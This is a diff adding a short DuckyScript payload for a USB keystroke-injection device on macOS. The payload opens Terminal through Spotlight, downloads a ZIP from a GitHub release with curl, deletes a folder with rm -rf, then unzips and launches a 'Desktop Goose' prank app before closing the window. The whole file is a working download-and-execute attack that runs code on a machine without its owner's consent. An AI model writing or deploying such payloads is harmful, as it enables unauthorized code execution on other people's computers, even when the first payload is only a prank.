@@ -1,0 +1,21 @@
+REM Download and execute anoying goose
+
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 750
+
+STRING curl -LO https://github.com/SantiMoncada/DuckyScripts/releases/download/Goose/DesktopGooseMac.zip
+ENTER
+DELAY 5000
+
+STRING rm -rf GooseFolder && unzip DesktopGooseMac.zip -d GooseFolder && open -n GooseFolder/Desktop\ Goose.app
+ENTER
+DELAY 500
+
+GUI W
+
+
